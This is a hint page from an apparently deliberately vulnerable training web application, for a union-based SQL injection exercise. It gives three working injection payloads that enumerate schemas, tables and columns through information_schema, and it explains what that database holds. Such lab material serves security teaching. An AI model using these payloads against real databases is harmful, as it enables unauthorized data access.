<?php include 'includes.php'; ?>

<body>
	<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">
		<div class="row">
			<ol class="breadcrumb">
				<li><a href="index.php">
					<em class="fa fa-home"></em>
				</a></li>
				<li><a href="sqli_index.php">SQLi</a></li>
				<li><a href="sqli_union.php">Union-based SQLi</a></li>
				<li class="active">Exercise 5</li>
			</ol>
		</div>
		
		<div class="row">
			<div class="col-lg-12">
				
			</div>
		</div>
		
		<div class="row">
			<div class="col-md-12">
				<div class="divider"></div>
				<div class="panel panel-primary">
					<div class="panel-heading">Take a small bite!</div>
					<div class="panel-body">
						<p><p>
						<p><span class="glyphicon glyphicon-hand-right"></span> <b>Spoiler:</b> Query the metadata table <em>information_schema.columns.</em>
						Try <br>' OR 1=0 UNION SELECT 1,schema_name,3,4,5,6 from information_schema.schemata--+<br>
						' OR 1=0 UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema="svwa"--+<br>
						' OR 1=0 UNION SELECT 1,column_name,3,4,5,6 from information_schema.columns where table_schema="svwa"--+<br>
						</p>

						<p><span class="glyphicon glyphicon-hand-right"></span> <b>Elaboration: </b>The <em>information_schema</em> database is a read-only database that holds the information about all the other databases: information such as table names, column names, and privileges of every database.</p>
						<hr>
						<p>
							<b>Low:</b> <br>	
						</p><hr>
						<p>
							<b>Medium:</b>
						</p><hr>
						<p>
							<b>High:</b> 
						</p><hr>
						<p><span class="glyphicon glyphicon-hand-right"></span>
							<b> Links: </b> <a href="https://www.google.com">Google Search</a>
						</p>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="col-sm-12">
		<p class="back-link">Sandwich Vulnerable Web app (SVWA) by <a href="#">SecurityGeeks</a></p>
	</div>